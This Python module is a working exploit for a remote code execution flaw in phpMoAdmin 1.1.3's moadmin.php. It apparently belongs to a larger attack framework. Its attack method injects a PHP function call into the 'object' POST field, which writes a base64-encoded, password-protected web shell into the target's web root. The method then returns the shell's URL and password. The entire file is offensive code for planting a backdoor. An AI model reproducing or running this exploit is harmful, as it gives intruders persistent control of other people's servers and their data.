#!/usr/bin/env python
# -*- coding: utf-8 -*-

# author: zhangxf55
# phpMoAdmin(MongoDB Web Admin) 1.1.3 /moadmin.php Remote Code Execution
# see: https://www.seebug.org/vuldb/ssvid-89063

import sys
import requests
sys.path.append("..")
from models.payload import Payload,PayloadFailException
from models.engine import Engine
from configuration import configuration as config
from utils import Utils
from uuid import uuid1
from hashlib import md5

class MoAdmin(Payload):
    def attack(self):
        password = Utils.getPassword(self.host)
        shellContent = Engine(config.defaultHorse).base64({'password':password})
        shellName = Utils.randmd5() + ".php"
        moadminUrl = "http://{}/moadmin.php".format(self.host)
        # config.webRoot must writable, or shellpath must be changed
        data = {
            "object": "1;{}('echo {} | base64 -d > {}');exit".format(config.phpFunction, shellContent, config.webRoot+"/"+shellName)
        }
        try:
            resp = requests.post(url=moadminUrl, data=data, headers=config.headers)
            if resp.status_code == 200:
                location = "http://{}/{}".format(self.host, shellName)
                return location, password
            else:
                raise PayloadFailException
        except:
            raise PayloadFailException
